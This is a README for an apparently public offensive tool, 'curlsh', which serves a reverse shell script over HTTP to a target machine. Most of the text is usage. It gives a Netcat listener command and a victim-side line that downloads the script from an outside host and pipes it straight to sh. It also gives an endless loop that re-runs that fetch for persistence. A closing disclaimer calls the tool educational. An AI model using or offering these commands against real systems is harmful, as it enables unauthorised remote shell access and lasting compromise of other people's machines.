# Simple curl reverse shell

This project implements a simple HTTP server that serves a reverse shell script to a target machine. The reverse shell script attempts to connect back to a specified IP address and port using various methods, including Python, Perl, Netcat, and `/bin/sh`.

## Features

- Supports multiple reverse shell methods:
  - Python (both Python 2 and Python 3)
  - Perl
  - Netcat
  - /bin/sh
- Graceful shutdown on `Ctrl+C`.
- Easily customizable IP and port configuration.

## Requirements

- A Unix-like operating system (Linux, macOS).
- `bash`, `nc` (Netcat), `python` or `python3`, and `perl` should be installed on the system running the script.

## Usage

1. Clone this repository:
   ```bash
   git clone https://github.com/laztname/curlsh.git
   cd curlsh
   ```

2. Make the script executable:
   ```
   chmod +x curlsh
   ```

3. Run the script with the target IP, target port, and listening port:
   ```
   ./curlsh <target_ip> <target_port> <listening_port>
   ```
- <target_ip>: The IP address of the target machine you want the reverse shell to connect to.
- <target_port>: The port on the target machine to connect to.
- <listening_port>: The port on your machine to listen for incoming requests.

## Example

On the listener (192.168.1.100) run the script
```bash
./curlsh 192.168.1.101 1337 8080
```

On your machine (192.168.1.101) listen the port
```bash
nc -lvp 1337
```

On target machine (192.168.1.102) call the reverse shell
```bash
curl -s 192.168.1.100:8080|sh
```
or run this for persistence on the target machine
```bash
while true; do curl -s 192.168.1.100:8080 | sh; done
```


## Disclaimer

This tool is intended for educational purposes only. Ensure you have permission to test the security of any system before using this script. Unauthorized use may violate laws and regulations.
